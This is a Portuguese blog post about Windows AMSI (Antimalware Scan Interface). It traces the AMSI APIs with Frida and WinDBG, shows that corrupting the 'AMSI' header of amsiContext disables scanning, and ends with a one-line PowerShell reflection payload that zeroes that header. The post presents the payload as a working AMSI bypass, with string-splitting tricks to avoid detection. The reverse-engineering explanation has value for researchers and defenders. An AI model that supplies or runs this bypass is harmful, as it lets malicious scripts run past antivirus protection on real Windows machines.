---
layout: post
title: From AMSI(RE) to Reflection
author: sorahed
image: /assets/banners/scoobydoo.png
description: "Realizando hook das APIs do AMSI, e fazendo engenharia reversa para entender as chamadas, e por sua vez construir um bypass."
toc: true
---

Dentre as diversas proteções que o Windows oferece, temos o AMSI(Anti Scan Malware Interface) é uma interface que o Windows utiliza para integrar e detectar comportamento malicioso em outras funcionalidades do sistemaoperacional, dentre eles:

- Contas de usuário ou UAC
- Powershell
- Windows Script Host(wscript.exe e cscript.exe)
- Office VBA Macros
- JavaScript and VBScript

Qualquer antivírus pode ultilizar essa interface para estender sua proteção para essas funcionalidades.

![Untitled](/assets/img/Untitled.png)

## Amsi Overview

Ná prática, o AMSI captura funções (Por exemplo de powershell ou VBScript) usadas por nós e envia para análise de antivírus.

![amsi overview.png](/assets/img/amsi_overview.png)

- Nesse diagrama, **amsi.dll** é carregado no processo do powershell.
- Todas as funções então são passadas pelas 2 APIs, que envia para a ferramenta de antivírus através do RPC.
- O Antivírus analisa e envia de volta para o powershell o resultado através de RPC.

## APIs Exportadas

Algumas APIs são exportadas por essa dll, tais como:

- AmsiInitialize
- AmsiOpenSession
- AmsiScanString
- AmsiCloseSession

## AmsiInitialize

- Após carregar a **amsi.dll** no processo, essa é a primeira API a ser ultilizada.
- Ela é chamada antes de todasd as funções do powershell, não sendo possível influenciar seu comportamento.
- Recebe dois parâmetros, o nome da aplicação e um ponteiro para uma estrutura de memória que é populada pela API durante o uso.

```cpp
HRESULT AmsiInitialize(
  [in]  LPCWSTR      appName,
  [out] HAMSICONTEXT *amsiContext
);
```

## AmsiOpenSession

- Essa API é ultilizada assim que o AMSI é iniciado com a API anterior.
- Recebe uma estrutura de memória criada anteriormente e também cria um objeto de sessão, que será ultilizado durante o ciclo de vida do processo.

```cpp
HRESULT AmsiOpenSession(
  [in]  HAMSICONTEXT amsiContext,
  [out] HAMSISESSION *amsiSession
);
```

## AmsiScanString & AmsiScanBuffer

- **AmsiScanString e AmsiScanBuffer** são ultilizados para capturar input do console ou conteúdo de um script se ultilizados como strings ou buffers binários.
- Recebe a estrutura criada anteriormente, o buffer a ser escaneado, o tamanho do buffer, um identificador, a sessão também criada anteriormente um ponteiro para um buffer que conterá o resultado.
- Windows Defender então realiza o scan da função e retorna o valor no *buffer result* . O resultado é 1 se não houver nada malicioso e 32768 no caso de detecção.
- O que muda para o **AmsiScanString** é que existe o campo string ao invés do buffer
- Após o uso, a API **AmsiCloseSession** é usada.

```cpp
HRESULT AmsiScanBuffer(
  [in]           HAMSICONTEXT amsiContext,
  [in]           PVOID        buffer,
  [in]           ULONG        length,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
```

⣴⢖⡶⣲⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣿⢾⣒⣦⠀
⣿⣿⡾⣫⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣷⣌⠳⣝⣿⡄
⣿⡿⣿⣿⣿⣻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣟⣿⣿⣿⢾⣿⠆
⠀⠀⠈⠹⣿⣿⣟⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⢷⣀⣀⣀⠀⢀⣀⣀⣶⣿⣿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣻⣿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠉⠿⣿⣿⣖⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣯⣸⣿⡋⠉⠀⠈⠙⣯⣏⣏⢿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣟⣿⢿⣿⡿⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠛⢿⣿⠶⢚⣻⣦⡀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⡷⠂⠀⠀⠰⣿⣿⣾⣮⢧⡀⠀⠀⠀⠀⠀⠀⣰⣟⡛⠻⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣭⣭⣿⣿⣦⡀⠀⠀⣠⣾⣿⣿⡯⠄⠀⠀⠀⠀⠀⠀⠀⠀⠨⣿⣧⣙⣦⡀⠀⢀⣴⣿⣿⣿⢭⣽⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣟⣯⣭⣽⣽⣶⣾⡟⡿⠋⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⡷⣿⣶⣮⣽⣯⣟⣻⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣿⣿⣿⣿⡿⢷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡷⢿⣿⢿⣿⣷⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⠿⢿⣧⡀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⠀⣴⣿⠿⢷⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⠀⠀⣀⣠⣞⣷⡿⠿⠟⢦⠈⠳⣜⣢⡀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⣠⣞⠞⠁⣠⠾⠿⢿⣮⣳⢤⣀⠀⠀⣀⣀⡀⠀⠀⠀⠀
⠀⠀⠀⢹⡿⣿⢖⣻⣽⣾⣿⡏⠀⠀⠀⠈⠳⣄⠈⠳⣝⢄⠈⠳⣄⠀⠀⠀⠀⠀⢀⡼⠃⢀⣞⠷⠉⢀⡞⠁⠀⠀⠀⠸⣿⣷⣾⢭⣓⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠘⢓⣿⣶⣾⣿⠁⠈⠀⠀⠀⠀⠀⠀⠈⢳⡄⠈⠶⡳⡄⠈⢳⡄⠀⠀⣴⠋⢀⣴⡿⠋⢀⡴⠋⠀⠀⠀⠀⠀⠀⠉⠘⢻⣷⣮⣿⣟⠉⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡿⠀⠙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠙⢮⠣⡄⠙⣦⠚⠀⣴⣿⠋⠀⣠⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠘⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠑⣬⠞⠁⣠⣞⠟⠁⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡶⠋⢀⢴⠵⠁⣠⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠋⢀⡴⡛⠉⢀⡴⠋⠘⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⡰⠋⠂⢀⣴⣏⠈⢢⣣⡀⠙⢦⡀⠀⠀Lets Bypass
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⣠⡞⠂⠀⣠⠞⠀⠙⢦⡀⠙⢭⣂⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡰⠋⢀⢔⠗⠁⣠⠞⠁⠀⠀⠀⠀⠙⢦⡀⠑⣗⣄⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢀⣴⠛⠁⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠛⠳⡀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⡀⠂⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠈⠺⣂⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠣⣀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠠⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⠋⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣌⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡼⠁⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢄⡀⠳⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⡵⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣿⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Vimos nas outras APIs que o AMSI cria uma estrutura chamada amsiContext, porém não sabemos exatamente como ela funciona, uma vez que essa estrutura não é documentada.

Se conseguíssemos provocar algum erro nessa estrutura, provavelmente seria possível parar o processo do AMSI ou mesmo desativá-lo.

![https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif](https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif)

Vamos usar o Frida para localizar o endereço de memória e o WinDBG para examinar essa estrutura.

Iremos ver que, ao corromper o começo do AmsiContext, desativaremos o AMSI.

❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧───❅

Começaremos hookando as APIs do amsi.dll, para obter o endereço de memória do amsiContext, no meu caso eu possuo alguns arquivos de configurações para o frida, para auxiliar no trace das APIs, mas vamos lá.

 

```bash
frida-trace -p powershell-pid -x amsi.dll -i Amsi*
```

Após isso, o frida já esta fazendo o trace do nosso processo do powershell, neste caso se inserirmos alguma coisa, no powershell, já ira ser captada, eu vou digitar o famoso ‘amsiUtils’, que é uma string que ja possui assinatura, então o amsi detectará como malware.

<img src="/assets/img/AMSIBYPASS (1).png">

O amsiContext é uma estrutura cujo endereço de memória permanece o mesmo enquanto o processo do powershell está ativo, por isso, se conseguirmos fazer alguma alteração nessa estrutura, ele refletirá enquanto o processo está aberto.

Agora vamos para o WinDBG, analisar como essa estrutura se comporta, e por lá fazer o bypass !

Com o WinDBG aberto, basta dar um attach ao processo do powershell.

<img src="/assets/img/AMSIBYPASS (2).png">

Primeiramente, vamos fazer o dump do conteúdo existente dentro dessa estrutura:

```bash
dc endereçoAmsiContext
```

<img src="/assets/img/AMSIBYPASS (3).png">

Os 4 primeiros bytes são fixos, o que significa que essa string pode ser estática entre os processos

- Não sabemos como essa string é usada, porém pela documentação da API, ela é um argumento para a api AmsiOpenSession:

```cpp
HRESULT AmsiOpenSession(
  [in]  HAMSICONTEXT amsiContext,
  [out] HAMSISESSION *amsiSession
);
```

Podemos ver como essa API se comporta fazendo o disassembly

```bash
u amsi!AmsiOpenSession
```

<img src="/assets/img/AMSIBYPASS (4).png">

Conseguimos ver que a string AMSI é comparada com algum valor dentro de RCX. Em assembly 64 bits, RCX guarda o valor do primeiro argumento da função, que nesse caso, é justamente o **amsiContext,** ou seja, estamos comparando o cabeçalho do buffer com a string

Em caso da string não ser igual a AMSI, nos vamos para a instrução JNE, onde podemos digitar o comando para ver o assembly:

```bash
u amsi!AmsiOpenSession+0x4b L2
```

<img src="/assets/img/AMSIBYPASS (5).png">

Um valor é colocado em EAX e a função é retornada. ( Em assembly 32 e 64, os valores de funções são colocados em EAX).

❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧───❅

A função retorna um dado do tipo HRESULT, podemos ir na [documentação da microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8) e verificar qual valor significa esse resultado 80070057

<img src="/assets/img/AMSIBYPASS (6).png">

A função retorna um valor de argumento inválido e termina a execução.

- Como não sabemos o que irá acontecer se corromper essa estrutura, podemos testar e ver os resultados.

Para forçar esse erro, primeiro vamos fazer um breakpoint na função

```bash
bp amsi!AmsiOpenSession
```

Logo em seguida, resumimos a execução

```bash
g
```

Depois mandamos por exemplo a string que o amsi alerta, ‘amsiUtils’. Logo após isso, o breakpoint sera ativado:

<img src="/assets/img/AMSIBYPASS (7).png">

Agora ultilizando o comando **ed** do WinDBG, vamos escrever no endereço de memória e apagar o cabeçalho onde esta escrito AMSI

```bash
dc rcx L1
ed rcx 0
dc rcx L1
```

<img src="/assets/img/AMSIBYPASS (8).png">

Como resultado, após gerar o erro, conseguimos corromper o AMSI e executar a string sem bloqueios:

<img src="/assets/img/AMSIBYPASS (9).png">

## Criando o bypass com powershell

O powershell guarda informações do AMSI internamente dentro de uma classe chamada **System.Management.Automation.AmsiUtils,** como é um método interno, podemos ultilizar o conceito de **Reflection** para acessar seus métodos

Primeiro precisamos enumerar todos os tipos de dados existentes dentro dessa classe,
conseguimos fazer isso através do método **GetType**, presente dentro de uma estrutura
chamada **System.Management.Automation.PSReference**, ou **Ref.**

❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧──────❅•❅──────✧❅✦❅✧───❅

Uma estratégia é enumerar todos os tipos de dados existentes no processo do powershell:

```powershell
$a=[Ref].Assembly.GetTypes()
```

Logo em seguida, podemos criar um loop for que irá salvar somente o método que nós
queremos

```powershell
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
```

Dessa forma conseguimos acesso ao método sem que o AMSI alerte.

O próximo passo é enumerar todos os campos e objetos dessa classe, em powershell
fazemos isso com o método GetFields, vamos utilizar as propriedades NonPublic e static para
enumerar as estruturas que não são instanciadas dentro da classe.

Primeiro salvamos a referência ao amsiUtils

```powershell
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
```

Logo em seguida aplicamos o GetFields com as configurações mencionadas

```powershell
$c.GetFields('NonPublic,Static')
```

O primeiro campo é o que procuramos:

<img src="/assets/img/AMSIBYPASS (10).png">

Conseguimos acessar esse método, que é justamente o que precisamos para contornar o
AMSI, o único problema é que se colocarmos essa string no comando, o AMSI também irá
alertar como malicioso, uma vez que a string amsi é alertada. Porém podemos utilizar a
mesma técnica de antes para conseguir uma referência para esse campo.

Enumeramos todos os campos:

```powershell
$d=$c.GetFields('NonPublic,Static')
```

Utilizamos um loop for para salvar somente o desejado:

```powershell
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
```

E assim, salvamos uma referência a esse objeto:

<img src="/assets/img/AMSIBYPASS (11).png">

Podemos checar o conteúdo com o comando:

```powershell
$f.GetValue($null)
```

Que irá retornar um número decimal:

<img src="/assets/img/AMSIBYPASS (12).png">

Para confirmar que esse número é realmente o que estamos procurando, vamos convertê-lo
para hexadecimal, que no meu caso, será **0x1563745672608**.

Por último, temos que zerar a estrutura, igual fizemos no WinDBG. Para isso, vamos salvar
esse endereço em uma variável

```powershell
$g=$f.GetValue($null)
```

Criar um ponteiro para acessar o conteúdo do endereço de memória

```powershell
[IntPtr]$ptr=$g
```

Depois vamos criar uma variável com o conteúdo 0

```powershell
[Int32[]]$buf=@(0)
```

E por último, copiar o valor para o ponteiro com a função Copy:

```powershell
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Colocando tudo isso em uma linha, teremos o seguinte bypass:

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Assim criamos um bypass funcional para o AMSI:

<img src="/assets/img/AMSIBYPASS (13).png">

Obrigado por ler até aqui, e até a proxima.
